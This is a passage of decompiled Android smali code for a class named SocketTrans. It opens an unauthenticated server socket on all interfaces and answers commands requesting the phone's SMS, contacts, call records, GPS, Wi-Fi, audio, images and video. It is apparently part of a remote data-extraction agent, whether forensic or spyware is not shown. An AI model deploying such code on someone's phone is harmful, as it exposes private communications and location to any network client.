.class public Lcom/Android/MFSocket/SocketTrans;
.super Ljava/lang/Object;
.source "SocketTrans.java"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field private final CMD_APP:Ljava/lang/String;

.field private final CMD_AUDIO:Ljava/lang/String;

.field private final CMD_BT:Ljava/lang/String;

.field private final CMD_CALL:Ljava/lang/String;

.field private final CMD_CONTACT:Ljava/lang/String;

.field private final CMD_CONTACTSIM:Ljava/lang/String;

.field private final CMD_GPS:Ljava/lang/String;

.field private final CMD_IMAGE:Ljava/lang/String;

.field private final CMD_QUIT:Ljava/lang/String;

.field private final CMD_SMS:Ljava/lang/String;

.field private final CMD_SYS:Ljava/lang/String;

.field private final CMD_VIDEO:Ljava/lang/String;

.field private final CMD_WIFI:Ljava/lang/String;

.field private final SERVER_PORT:I

.field public activity:Lcom/Android/MFSocket/MFSocket;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 15
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 16
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    .line 18
    const/16 v0, 0x2776

    iput v0, p0, Lcom/Android/MFSocket/SocketTrans;->SERVER_PORT:I

    .line 19
    const-string v0, "4500_REQUEST_SYS"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_SYS:Ljava/lang/String;

    .line 20
    const-string v0, "4500_REQUEST_CONTACT"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_CONTACT:Ljava/lang/String;

    .line 21
    const-string v0, "4500_REQUEST_SIMCONTACT"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_CONTACTSIM:Ljava/lang/String;

    .line 22
    const-string v0, "4500_REQUEST_SMS"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_SMS:Ljava/lang/String;

    .line 23
    const-string v0, "4500_REQUEST_CALL"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_CALL:Ljava/lang/String;

    .line 24
    const-string v0, "4500_REQUEST_WIFI"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_WIFI:Ljava/lang/String;

    .line 25
    const-string v0, "4500_REQUEST_BT"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_BT:Ljava/lang/String;

    .line 26
    const-string v0, "4500_REQUEST_GPS"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_GPS:Ljava/lang/String;

    .line 27
    const-string v0, "4500_REQUEST_APP"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_APP:Ljava/lang/String;

    .line 28
    const-string v0, "4500_REQUEST_AUDIO"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_AUDIO:Ljava/lang/String;

    .line 29
    const-string v0, "4500_REQUEST_IMAGE"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_IMAGE:Ljava/lang/String;

    .line 30
    const-string v0, "4500_REQUEST_VIDEO"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_VIDEO:Ljava/lang/String;

    .line 31
    const-string v0, "4500_REQUEST_QUIT"

    iput-object v0, p0, Lcom/Android/MFSocket/SocketTrans;->CMD_QUIT:Ljava/lang/String;

    .line 15
    return-void
.end method

.method public static receveData(Ljava/io/BufferedReader;Ljava/lang/StringBuffer;)V
    .locals 3
    .param p0, "in"    # Ljava/io/BufferedReader;
    .param p1, "data"    # Ljava/lang/StringBuffer;

    .prologue
    .line 85
    const/16 v2, 0x64

    :try_start_0
    new-array v0, v2, [C

    .line 86
    .local v0, "buf":[C
    invoke-virtual {p0, v0}, Ljava/io/BufferedReader;->read([C)I

    .line 87
    invoke-virtual {p1, v0}, Ljava/lang/StringBuffer;->append([C)Ljava/lang/StringBuffer;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 92
    .end local v0    # "buf":[C
    :goto_0
    return-void

    .line 89
    :catch_0
    move-exception v1

    .line 90
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendData(Ljava/io/BufferedOutputStream;Landroid/graphics/Bitmap;)V
    .locals 10
    .param p0, "out"    # Ljava/io/BufferedOutputStream;
    .param p1, "bmp"    # Landroid/graphics/Bitmap;

    .prologue
    .line 61
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 62
    .local v0, "baos":Ljava/io/ByteArrayOutputStream;
    sget-object v8, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v9, 0x64

    invoke-virtual {p1, v8, v9, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 63
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v6

    .line 66
    .local v6, "sendBuf":[B
    :try_start_0
    array-length v4, v6

    .line 67
    .local v4, "len":I
    new-instance v5, Ljava/lang/StringBuffer;

    invoke-direct {v5}, Ljava/lang/StringBuffer;-><init>()V

    .line 68
    .local v5, "sbLen":Ljava/lang/StringBuffer;
    invoke-virtual {v5, v4}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    .line 69
    invoke-virtual {v5}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    .line 70
    .local v7, "tmp":[B
    const/16 v8, 0x40

    new-array v1, v8, [B

    .line 71
    .local v1, "bufLen":[B
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_0
    array-length v8, v7

    if-ge v3, v8, :cond_0

    array-length v8, v1

    if-lt v3, v8, :cond_1

    .line 74
    :cond_0
    invoke-virtual {p0, v1}, Ljava/io/BufferedOutputStream;->write([B)V

    .line 75
    invoke-virtual {p0}, Ljava/io/BufferedOutputStream;->flush()V

    .line 76
    invoke-virtual {p0, v6}, Ljava/io/BufferedOutputStream;->write([B)V

    .line 77
    invoke-virtual {p0}, Ljava/io/BufferedOutputStream;->flush()V

    .line 81
    .end local v1    # "bufLen":[B
    .end local v3    # "i":I
    .end local v4    # "len":I
    .end local v5    # "sbLen":Ljava/lang/StringBuffer;
    .end local v7    # "tmp":[B
    :goto_1
    return-void

    .line 72
    .restart local v1    # "bufLen":[B
    .restart local v3    # "i":I
    .restart local v4    # "len":I
    .restart local v5    # "sbLen":Ljava/lang/StringBuffer;
    .restart local v7    # "tmp":[B
    :cond_1
    aget-byte v8, v7, v3

    aput-byte v8, v1, v3
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 71
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 78
    .end local v1    # "bufLen":[B
    .end local v3    # "i":I
    .end local v4    # "len":I
    .end local v5    # "sbLen":Ljava/lang/StringBuffer;
    .end local v7    # "tmp":[B
    :catch_0
    move-exception v2

    .line 79
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1
.end method

.method public static sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V
    .locals 8
    .param p0, "out"    # Ljava/io/BufferedOutputStream;
    .param p1, "data"    # Ljava/lang/String;

    .prologue
    .line 34
    if-nez p1, :cond_1

    .line 57
    :cond_0
    :goto_0
    return-void

    .line 37
    :cond_1
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_0

    .line 41
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    .line 42
    .local v5, "sendBuf":[B
    array-length v3, v5

    .line 43
    .local v3, "len":I
    new-instance v4, Ljava/lang/StringBuffer;

    invoke-direct {v4}, Ljava/lang/StringBuffer;-><init>()V

    .line 44
    .local v4, "sbLen":Ljava/lang/StringBuffer;
    invoke-virtual {v4, v3}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    .line 45
    invoke-virtual {v4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    .line 46
    .local v6, "tmp":[B
    const/16 v7, 0x40

    new-array v0, v7, [B

    .line 47
    .local v0, "bufLen":[B
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_1
    array-length v7, v6

    if-ge v2, v7, :cond_2

    array-length v7, v0

    if-lt v2, v7, :cond_3

    .line 50
    :cond_2
    invoke-virtual {p0, v0}, Ljava/io/BufferedOutputStream;->write([B)V

    .line 51
    invoke-virtual {p0}, Ljava/io/BufferedOutputStream;->flush()V

    .line 52
    invoke-virtual {p0, v5}, Ljava/io/BufferedOutputStream;->write([B)V

    .line 53
    invoke-virtual {p0}, Ljava/io/BufferedOutputStream;->flush()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 54
    .end local v0    # "bufLen":[B
    .end local v2    # "i":I
    .end local v3    # "len":I
    .end local v4    # "sbLen":Ljava/lang/StringBuffer;
    .end local v5    # "sendBuf":[B
    .end local v6    # "tmp":[B
    :catch_0
    move-exception v1

    .line 55
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 48
    .end local v1    # "e":Ljava/io/IOException;
    .restart local v0    # "bufLen":[B
    .restart local v2    # "i":I
    .restart local v3    # "len":I
    .restart local v4    # "sbLen":Ljava/lang/StringBuffer;
    .restart local v5    # "sendBuf":[B
    .restart local v6    # "tmp":[B
    :cond_3
    :try_start_1
    aget-byte v7, v6, v2

    aput-byte v7, v0, v2
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    .line 47
    add-int/lit8 v2, v2, 0x1

    goto :goto_1
.end method


# virtual methods
.method public run()V
    .locals 26

    .prologue
    .line 96
    :try_start_0
    invoke-static {}, Ljava/nio/channels/ServerSocketChannel;->open()Ljava/nio/channels/ServerSocketChannel;

    move-result-object v8

    .line 97
    .local v8, "channel":Ljava/nio/channels/ServerSocketChannel;
    const/16 v24, 0x1

    move/from16 v0, v24

    invoke-virtual {v8, v0}, Ljava/nio/channels/ServerSocketChannel;->configureBlocking(Z)Ljava/nio/channels/SelectableChannel;

    .line 99
    new-instance v13, Ljava/net/InetSocketAddress;

    const-string v24, "0.0.0.0"

    const/16 v25, 0x2776

    move-object/from16 v0, v24

    move/from16 v1, v25

    invoke-direct {v13, v0, v1}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 101
    .local v13, "localInetSocketAddress":Ljava/net/InetSocketAddress;
    :try_start_1
    invoke-virtual {v8}, Ljava/nio/channels/ServerSocketChannel;->socket()Ljava/net/ServerSocket;

    move-result-object v24

    move-object/from16 v0, v24

    invoke-virtual {v0, v13}, Ljava/net/ServerSocket;->bind(Ljava/net/SocketAddress;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/SecurityException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 107
    :try_start_2
    invoke-virtual {v8}, Ljava/nio/channels/ServerSocketChannel;->socket()Ljava/net/ServerSocket;

    move-result-object v18

    .line 108
    .local v18, "serverSocket":Ljava/net/ServerSocket;
    const/16 v24, 0x7530

    move-object/from16 v0, v18

    move/from16 v1, v24

    invoke-virtual {v0, v1}, Ljava/net/ServerSocket;->setSoTimeout(I)V

    .line 110
    const/4 v4, 0x0

    .line 111
    .local v4, "bStop":Z
    :goto_0
    if-eqz v4, :cond_0

    .line 246
    invoke-virtual {v8}, Ljava/nio/channels/ServerSocketChannel;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 250
    .end local v4    # "bStop":Z
    .end local v8    # "channel":Ljava/nio/channels/ServerSocketChannel;
    .end local v13    # "localInetSocketAddress":Ljava/net/InetSocketAddress;
    .end local v18    # "serverSocket":Ljava/net/ServerSocket;
    :goto_1
    return-void

    .line 102
    .restart local v8    # "channel":Ljava/nio/channels/ServerSocketChannel;
    .restart local v13    # "localInetSocketAddress":Ljava/net/InetSocketAddress;
    :catch_0
    move-exception v12

    .local v12, "localIOException":Ljava/io/IOException;
    goto :goto_1

    .line 104
    .end local v12    # "localIOException":Ljava/io/IOException;
    :catch_1
    move-exception v14

    .local v14, "localSecurityException":Ljava/lang/SecurityException;
    goto :goto_1

    .line 112
    .end local v14    # "localSecurityException":Ljava/lang/SecurityException;
    .restart local v4    # "bStop":Z
    .restart local v18    # "serverSocket":Ljava/net/ServerSocket;
    :cond_0
    const/4 v9, 0x0

    .line 114
    .local v9, "client":Ljava/net/Socket;
    :try_start_3
    invoke-virtual/range {v18 .. v18}, Ljava/net/ServerSocket;->accept()Ljava/net/Socket;

    move-result-object v9

    .line 115
    new-instance v11, Ljava/io/BufferedReader;

    new-instance v24, Ljava/io/InputStreamReader;

    invoke-virtual {v9}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v25

    invoke-direct/range {v24 .. v25}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    move-object/from16 v0, v24

    invoke-direct {v11, v0}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 116
    .local v11, "in":Ljava/io/BufferedReader;
    new-instance v17, Ljava/io/BufferedOutputStream;

    invoke-virtual {v9}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v24

    move-object/from16 v0, v17

    move-object/from16 v1, v24

    invoke-direct {v0, v1}, Ljava/io/BufferedOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 119
    .local v17, "out":Ljava/io/BufferedOutputStream;
    new-instance v20, Ljava/lang/StringBuffer;

    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuffer;-><init>()V

    .line 120
    .local v20, "strCmdBuffer":Ljava/lang/StringBuffer;
    move-object/from16 v0, v20

    invoke-static {v11, v0}, Lcom/Android/MFSocket/SocketTrans;->receveData(Ljava/io/BufferedReader;Ljava/lang/StringBuffer;)V

    .line 121
    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v19

    .line 123
    .local v19, "strCmd":Ljava/lang/String;
    new-instance v22, Ljava/lang/StringBuffer;

    invoke-direct/range {v22 .. v22}, Ljava/lang/StringBuffer;-><init>()V

    .line 124
    .local v22, "strData":Ljava/lang/StringBuffer;
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_SYS"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_SYS"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_1

    .line 125
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Lcom/Android/MFSocket/MFSocket;->getSystem(Ljava/lang/StringBuffer;)V

    .line 236
    :goto_2
    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v24

    move-object/from16 v0, v17

    move-object/from16 v1, v24

    invoke-static {v0, v1}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 237
    invoke-virtual/range {v17 .. v17}, Ljava/io/BufferedOutputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 243
    :try_start_4
    invoke-virtual {v9}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_0

    .line 247
    .end local v4    # "bStop":Z
    .end local v8    # "channel":Ljava/nio/channels/ServerSocketChannel;
    .end local v9    # "client":Ljava/net/Socket;
    .end local v11    # "in":Ljava/io/BufferedReader;
    .end local v13    # "localInetSocketAddress":Ljava/net/InetSocketAddress;
    .end local v17    # "out":Ljava/io/BufferedOutputStream;
    .end local v18    # "serverSocket":Ljava/net/ServerSocket;
    .end local v19    # "strCmd":Ljava/lang/String;
    .end local v20    # "strCmdBuffer":Ljava/lang/StringBuffer;
    .end local v22    # "strData":Ljava/lang/StringBuffer;
    :catch_2
    move-exception v10

    .line 248
    .local v10, "e":Ljava/lang/Exception;
    invoke-virtual {v10}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 126
    .end local v10    # "e":Ljava/lang/Exception;
    .restart local v4    # "bStop":Z
    .restart local v8    # "channel":Ljava/nio/channels/ServerSocketChannel;
    .restart local v9    # "client":Ljava/net/Socket;
    .restart local v11    # "in":Ljava/io/BufferedReader;
    .restart local v13    # "localInetSocketAddress":Ljava/net/InetSocketAddress;
    .restart local v17    # "out":Ljava/io/BufferedOutputStream;
    .restart local v18    # "serverSocket":Ljava/net/ServerSocket;
    .restart local v19    # "strCmd":Ljava/lang/String;
    .restart local v20    # "strCmdBuffer":Ljava/lang/StringBuffer;
    .restart local v22    # "strData":Ljava/lang/StringBuffer;
    :cond_1
    const/16 v24, 0x0

    :try_start_5
    const-string v25, "4500_REQUEST_CONTACT"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_CONTACT"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_4

    .line 127
    const/16 v16, 0x1

    .line 128
    .local v16, "nOneTimeCount":I
    const-string v24, "4500_REQUEST_CONTACT"

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_CONTACT"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    add-int/lit8 v25, v25, 0x2

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v23

    .line 129
    .local v23, "strOneTime":Ljava/lang/String;
    const/16 v24, 0x0

    invoke-virtual/range {v23 .. v24}, Ljava/lang/String;->charAt(I)C

    move-result v6

    .line 130
    .local v6, "cNum1":C
    const/16 v24, 0x1

    invoke-virtual/range {v23 .. v24}, Ljava/lang/String;->charAt(I)C
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    move-result v7

    .line 131
    .local v7, "cNum2":C
    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v6, v0, :cond_3

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v6, v0, :cond_3

    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v7, v0, :cond_3

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v7, v0, :cond_3

    .line 133
    :try_start_6
    invoke-static/range {v23 .. v23}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    move-result v16

    .line 137
    :goto_3
    if-lez v16, :cond_2

    const/16 v24, 0x64

    move/from16 v0, v16

    move/from16 v1, v24

    if-lt v0, v1, :cond_3

    .line 138
    :cond_2
    const/16 v16, 0x1

    .line 141
    :cond_3
    :try_start_7
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v17

    move-object/from16 v2, v22

    move/from16 v3, v16

    invoke-virtual {v0, v1, v2, v3}, Lcom/Android/MFSocket/MFSocket;->getContact(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    goto/16 :goto_2

    .line 240
    .end local v6    # "cNum1":C
    .end local v7    # "cNum2":C
    .end local v11    # "in":Ljava/io/BufferedReader;
    .end local v16    # "nOneTimeCount":I
    .end local v17    # "out":Ljava/io/BufferedOutputStream;
    .end local v19    # "strCmd":Ljava/lang/String;
    .end local v20    # "strCmdBuffer":Ljava/lang/StringBuffer;
    .end local v22    # "strData":Ljava/lang/StringBuffer;
    .end local v23    # "strOneTime":Ljava/lang/String;
    :catch_3
    move-exception v10

    .line 241
    .restart local v10    # "e":Ljava/lang/Exception;
    :try_start_8
    invoke-virtual {v10}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 243
    :try_start_9
    invoke-virtual {v9}, Ljava/net/Socket;->close()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_2

    goto/16 :goto_0

    .line 134
    .end local v10    # "e":Ljava/lang/Exception;
    .restart local v6    # "cNum1":C
    .restart local v7    # "cNum2":C
    .restart local v11    # "in":Ljava/io/BufferedReader;
    .restart local v16    # "nOneTimeCount":I
    .restart local v17    # "out":Ljava/io/BufferedOutputStream;
    .restart local v19    # "strCmd":Ljava/lang/String;
    .restart local v20    # "strCmdBuffer":Ljava/lang/StringBuffer;
    .restart local v22    # "strData":Ljava/lang/StringBuffer;
    .restart local v23    # "strOneTime":Ljava/lang/String;
    :catch_4
    move-exception v10

    .line 135
    .restart local v10    # "e":Ljava/lang/Exception;
    const/16 v16, 0x1

    goto :goto_3

    .line 142
    .end local v6    # "cNum1":C
    .end local v7    # "cNum2":C
    .end local v10    # "e":Ljava/lang/Exception;
    .end local v16    # "nOneTimeCount":I
    .end local v23    # "strOneTime":Ljava/lang/String;
    :cond_4
    const/16 v24, 0x0

    :try_start_a
    const-string v25, "4500_REQUEST_SIMCONTACT"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_SIMCONTACT"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_5

    .line 143
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    const/16 v25, 0x1

    move-object/from16 v0, v24

    move-object/from16 v1, v17

    move-object/from16 v2, v22

    move/from16 v3, v25

    invoke-virtual {v0, v1, v2, v3}, Lcom/Android/MFSocket/MFSocket;->getSimContact(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_3
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    goto/16 :goto_2

    .line 242
    .end local v11    # "in":Ljava/io/BufferedReader;
    .end local v17    # "out":Ljava/io/BufferedOutputStream;
    .end local v19    # "strCmd":Ljava/lang/String;
    .end local v20    # "strCmdBuffer":Ljava/lang/StringBuffer;
    .end local v22    # "strData":Ljava/lang/StringBuffer;
    :catchall_0
    move-exception v24

    .line 243
    :try_start_b
    invoke-virtual {v9}, Ljava/net/Socket;->close()V

    .line 244
    throw v24
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_2

    .line 144
    .restart local v11    # "in":Ljava/io/BufferedReader;
    .restart local v17    # "out":Ljava/io/BufferedOutputStream;
    .restart local v19    # "strCmd":Ljava/lang/String;
    .restart local v20    # "strCmdBuffer":Ljava/lang/StringBuffer;
    .restart local v22    # "strData":Ljava/lang/StringBuffer;
    :cond_5
    const/16 v24, 0x0

    :try_start_c
    const-string v25, "4500_REQUEST_SMS"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_SMS"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_8

    .line 145
    const/16 v16, 0x1

    .line 146
    .restart local v16    # "nOneTimeCount":I
    const-string v24, "4500_REQUEST_SMS"

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_SMS"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    add-int/lit8 v25, v25, 0x2

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v23

    .line 147
    .restart local v23    # "strOneTime":Ljava/lang/String;
    const/16 v24, 0x0

    invoke-virtual/range {v23 .. v24}, Ljava/lang/String;->charAt(I)C

    move-result v6

    .line 148
    .restart local v6    # "cNum1":C
    const/16 v24, 0x1

    invoke-virtual/range {v23 .. v24}, Ljava/lang/String;->charAt(I)C
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_3
    .catchall {:try_start_c .. :try_end_c} :catchall_0

    move-result v7

    .line 149
    .restart local v7    # "cNum2":C
    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v6, v0, :cond_7

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v6, v0, :cond_7

    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v7, v0, :cond_7

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v7, v0, :cond_7

    .line 151
    :try_start_d
    invoke-static/range {v23 .. v23}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_5
    .catchall {:try_start_d .. :try_end_d} :catchall_0

    move-result v16

    .line 155
    :goto_4
    if-lez v16, :cond_6

    const/16 v24, 0x64

    move/from16 v0, v16

    move/from16 v1, v24

    if-lt v0, v1, :cond_7

    .line 156
    :cond_6
    const/16 v16, 0x1

    .line 159
    :cond_7
    :try_start_e
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v17

    move-object/from16 v2, v22

    move/from16 v3, v16

    invoke-virtual {v0, v1, v2, v3}, Lcom/Android/MFSocket/MFSocket;->getSms(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V

    goto/16 :goto_2

    .line 152
    :catch_5
    move-exception v10

    .line 153
    .restart local v10    # "e":Ljava/lang/Exception;
    const/16 v16, 0x1

    goto :goto_4

    .line 160
    .end local v6    # "cNum1":C
    .end local v7    # "cNum2":C
    .end local v10    # "e":Ljava/lang/Exception;
    .end local v16    # "nOneTimeCount":I
    .end local v23    # "strOneTime":Ljava/lang/String;
    :cond_8
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_CALL"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_CALL"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_b

    .line 161
    const/16 v16, 0x1

    .line 162
    .restart local v16    # "nOneTimeCount":I
    const-string v24, "4500_REQUEST_CALL"

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_CALL"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    add-int/lit8 v25, v25, 0x2

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v23

    .line 163
    .restart local v23    # "strOneTime":Ljava/lang/String;
    const/16 v24, 0x0

    invoke-virtual/range {v23 .. v24}, Ljava/lang/String;->charAt(I)C

    move-result v6

